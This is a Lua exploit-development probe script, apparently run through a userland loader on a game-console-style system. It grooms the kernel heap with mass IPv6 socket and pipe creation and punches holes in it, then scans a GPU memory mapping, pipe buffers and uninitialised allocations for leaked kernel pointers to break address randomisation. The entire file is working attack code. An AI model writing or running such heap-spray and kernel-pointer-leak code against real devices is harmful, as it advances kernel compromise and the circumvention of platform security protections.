-- CRASH_CLASS: LOW
-- PROBE 125m: Heap spray kernel objects, scan GPU mmap for leaked kernel pointers
-- Use the loader's native syscall interface instead of make_syscall

print("=== PROBE 125m: HEAP KPTR SCAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

-- Section A: Create kernel objects to spray heap
print("--- SECTION A: KERNEL OBJECT SPRAY ---")
local ipv6_fds = {}
local pipe_fds = {}

-- Create 100 IPv6 sockets with pktopts (kernel allocations)
for i = 1, 100 do
    local fd = syscall.socket(28, 2, 17)
    if to_num(fd) >= 0 then
        local pktinfo = memory.alloc(32)
        memory.write_dword(pktinfo + 16, 0)
        syscall.setsockopt(fd, 41, 46, pktinfo, 20)
        ipv6_fds[#ipv6_fds + 1] = fd
    end
end
print("created " .. #ipv6_fds .. " IPv6 sockets")

-- Create pipes
for i = 1, 50 do
    local ok, rd, wr = pcall(create_pipe)
    if ok and rd then
        pipe_fds[#pipe_fds + 1] = {rd, wr}
    end
end
print("created " .. #pipe_fds .. " pipes")

-- Close alternating sockets to create holes
for i = 1, #ipv6_fds, 2 do
    syscall.close(ipv6_fds[i])
end
print("closed " .. math.floor(#ipv6_fds / 2) .. " sockets (holes)")

-- Section B: GPU mmap and scan
print("")
print("--- SECTION B: GPU HEAP SCAN ---")

syscall.resolve({ mmap = 477 })
local gpu_size = 128 * 0x4000  -- 128 pages
local gpu = syscall.mmap(uint64(0), uint64(gpu_size), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gpu_h, gpu_l = get_hi_lo(gpu)
print(string.format("GPU mmap: 0x%08X%08X", gpu_h, gpu_l))

local kptrs = {}
local scan_end = gpu_size
if gpu_h == 0 and gpu_l > 0 then
    for off = 0, scan_end - 8, 8 do
        local ok, q = pcall(memory.read_qword, gpu + off)
        if ok and q then
            local h, l = get_hi_lo(q)
            -- Real kernel pointers: 0xFFFF8000-0xFFFFFFFE range
            -- Exclude sentinels: 0xFFFFFFFF_xxxxxxxx
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                kptrs[#kptrs + 1] = {off = off, h = h, l = l}
            end
        end
    end
end

print("kernel pointers found: " .. #kptrs)
for i, kp in ipairs(kptrs) do
    if i <= 50 then
        print(string.format("  +0x%06X: 0x%08X%08X", kp.off, kp.h, kp.l))
    end
end

-- Section C: Also scan around pipe buffer areas
print("")
print("--- SECTION C: PIPE BUFFER SCAN ---")
-- Write known pattern to pipes, then scan heap for adjacent kernel data
for i = 1, math.min(5, #pipe_fds) do
    local rd, wr = pipe_fds[i][1], pipe_fds[i][2]
    -- Write a marker pattern
    local marker = memory.alloc(64)
    for j = 0, 56, 8 do
        memory.write_qword(marker + j, uint64(string.format("0x%08X%08X", 0xAAAA0000 + i, 0xBBBB0000 + j)))
    end
    syscall.write(wr, marker, 64)
end

-- Scan GPU mmap for the marker patterns
local markers_found = 0
for off = 0, scan_end - 8, 8 do
    local ok, q = pcall(memory.read_qword, gpu + off)
    if ok and q then
        local h, l = get_hi_lo(q)
        if h >= 0xAAAA0000 and h <= 0xAAAA00FF then
            markers_found = markers_found + 1
            if markers_found <= 10 then
                print(string.format("  MARKER at +0x%06X: 0x%08X%08X", off, h, l))
                -- Dump surrounding context for kernel pointers
                for d = -64, 64, 8 do
                    if d ~= 0 and off + d >= 0 and off + d < scan_end then
                        local ok2, q2 = pcall(memory.read_qword, gpu + off + d)
                        if ok2 and q2 then
                            local h2, l2 = get_hi_lo(q2)
                            local tag = ""
                            if h2 >= 0xFFFF8000 and h2 < 0xFFFFFFFF then tag = " *** KPTR ***" end
                            if h2 ~= 0 or l2 ~= 0 then
                                print(string.format("    %+d: 0x%08X%08X%s", d, h2, l2, tag))
                            end
                        end
                    end
                end
            end
        end
    end
end
print("pipe markers found in heap: " .. markers_found)

-- Section D: Uninitialized heap scan
-- Allocate new memory and check for stale kernel pointers before zeroing
print("")
print("--- SECTION D: UNINITIALIZED ALLOC SCAN ---")
local uninit_kptrs = 0
for i = 1, 20 do
    local buf = memory.alloc(0x1000) -- 4KB each
    for off = 0, 0xFF8, 8 do
        local ok, q = pcall(memory.read_qword, buf + off)
        if ok and q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                uninit_kptrs = uninit_kptrs + 1
                if uninit_kptrs <= 20 then
                    print(string.format("  alloc[%d]+0x%03X: 0x%08X%08X", i, off, h, l))
                end
            end
        end
    end
end
print("uninit kernel pointers: " .. uninit_kptrs)

-- Cleanup
for i = 2, #ipv6_fds, 2 do syscall.close(ipv6_fds[i]) end
for i = 1, #pipe_fds do
    pcall(syscall.close, pipe_fds[i][1])
    pcall(syscall.close, pipe_fds[i][2])
end

print("=== PROBE 125m COMPLETE ===")
